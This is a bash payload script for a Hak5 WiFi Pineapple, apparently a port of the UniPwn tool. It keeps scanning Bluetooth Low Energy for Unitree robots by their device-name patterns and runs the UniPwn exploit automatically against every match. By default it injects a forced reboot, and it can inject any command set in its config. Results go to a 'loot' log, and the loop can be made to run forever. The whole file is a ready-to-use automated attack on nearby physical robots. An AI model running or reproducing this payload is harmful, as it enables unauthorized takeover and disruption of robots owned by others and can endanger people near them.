#!/bin/bash
# Title: UniPwn Robot Hunter
# Description: Automated alert payload: Monitors/exploits Unitree robots on BLE detection.
# Author: Bin4ry (orig) + out0fstep (Pineapple Port)
# Version: 1.5 
################################
# CONFIG
################################
UNIPWN_DIR="/root/payloads/UniPwn"
LOG_DIR="/root/loot"
OUTPUT_LOG="$LOG_DIR/unipwn-alert-$(date +%Y%m%d-%H%M%S).log"
SCAN_TIME=20 # Seconds per quick pre-scan
EXPLOIT_INTERVAL=60 # Seconds between full cycles (auto mode)
TARGET_CMD="reboot -f" # Fixed: Auto-inject this on trigger
MAX_CYCLES=60 # ~1hr max (0=unlimited); set to 0 for infinite
UNITREE_PATTERNS="Go2_|G1_|H1_|B2_|X1_" # Device name filters
LOG_TAG="[UNIPWN_ALERT]"
RUNNING=true
################################
# HAK5 COMMANDS
################################
if [ -f /lib/hak5/commands.sh ]; then
    . /lib/hak5/commands.sh
else
    LOG() { echo "$LOG_TAG $*"; }
    ALERT() { echo "$LOG_TAG ALERT: $*"; }
    LED() { :; }
    PRINT() { echo "$*"; }
    ALERT_RINGTONE() { :; } # Stub if not available
fi
################################
# FUNCTIONS
################################
check_deps() {
    if [ ! -d "$UNIPWN_DIR" ]; then
        ALERT "UniPwn missing! git clone https://github.com/Bin4ry/UniPwn.git $UNIPWN_DIR"
        LED FAIL
        exit 1
    fi
    if ! command -v python3 &> /dev/null; then
        ALERT "Python3 missing. opkg update && opkg install python3 python3-pip; pip install bleak"
        LED FAIL
        exit 1
    fi
    if ! bluetoothctl power on &> /dev/null || ! bluetoothctl show | grep -q "Powered: yes"; then
        ALERT "BLE not ready. opkg install bluez-utils; bluetoothctl power on"
        LED FAIL
        exit 1
    fi
    mkdir -p "$LOG_DIR"
    echo "=== Hunter Started: $(date) ===" >> "$OUTPUT_LOG"
    LOG "Deps OK: Auto-monitoring enabled"
}

run_exploit() {
    # Auto exploit: Force non-interactive
    cd "$UNIPWN_DIR" || { ALERT "Failed to cd to $UNIPWN_DIR"; return 1; }
    rm -f unitree_devices.db  # Fresh scan, no prompts
    local py_cmd="python3 unitree_hack.py -v"
    
    if [ "$TARGET_CMD" = "reboot -f" ]; then
        $py_cmd --reboot 2>&1 | tee -a "$OUTPUT_LOG"
    else
        echo -e "3\n$TARGET_CMD" | $py_cmd 2>&1 | tee -a "$OUTPUT_LOG"
    fi
    local rc=$?
    if [ $rc -eq 0 ] && grep -q "Exploit successful\|Command injected" "$OUTPUT_LOG" 2>/dev/null; then
        local pwned=$(grep -c "Exploit successful\|injected" "$OUTPUT_LOG" 2>/dev/null || echo 1)
        ALERT_RINGTONE true "Robot pwned!"
        ALERT "ALERT: Exploited $pwned Unitree robot(s)! Cmd: $TARGET_CMD. Log: $OUTPUT_LOG"
        LED FINISH
        LOG "Success details: $(grep -E "(MAC|Address): [0-9A-F:]{17}" "$OUTPUT_LOG" 2>/dev/null || echo 'Check log')"
    else
        ALERT "Exploit attempted but failed (RC $rc). Target may have moved."
        LED FAIL
    fi
    return $rc
}

quick_scan() {
    # For auto: Just detect (no list)
    PRINT "Quick scanning BLE ($SCAN_TIME s) for targets..."
    timeout "$SCAN_TIME" bluetoothctl scan on > /dev/null 2>&1 &
    local scan_pid=$!
    sleep "$SCAN_TIME"
    kill "$scan_pid" 2>/dev/null
    bluetoothctl scan off
    local devices=$(bluetoothctl devices | grep -E "$UNITREE_PATTERNS" || true)
    if [ -n "$devices" ]; then
        echo "$devices" >> "$OUTPUT_LOG"
        LOG "Target detected: $devices"
        return 0  # Found
    else
        LOG "No targets in quick scan"
        return 1  # Not found
    fi
}

monitor_loop() {
    local cycle=0
    while [ $RUNNING = true ] && ( [ $MAX_CYCLES -eq 0 ] || [ $cycle -lt $MAX_CYCLES ] ); do
        cycle=$((cycle + 1))
        PRINT "Auto Cycle $cycle: Monitoring..."
        LED ATTACK
        
        if quick_scan; then
            LOG "Triggering auto-exploit..."
            run_exploit
            sleep 10  # Cooldown
        else
            PRINT "Quiet... Sleeping $EXPLOIT_INTERVAL s"
        fi
        
        LED SETUP
        sleep "$EXPLOIT_INTERVAL"
    done
    if [ $cycle -ge $MAX_CYCLES ] && [ $MAX_CYCLES -ne 0 ]; then
        ALERT "Auto ended after $MAX_CYCLES cycles (~1hr). Restart via GUI."
    fi
}
################################
# MAIN
################################
trap 'RUNNING=false; ALERT "Hunter stopped."; LED FINISH; exit 0' INT TERM
LED SETUP
LOG "UniPwn Auto Hunter starting - BLE robot pwner"
ALERT_RINGTONE true "Auto hunter armed"
check_deps
monitor_loop
echo "=== Hunter Ended: $(date) ===" >> "$OUTPUT_LOG"
ALERT "Hunter complete. Loot: $OUTPUT_LOG. Download via GUI."
exit 0
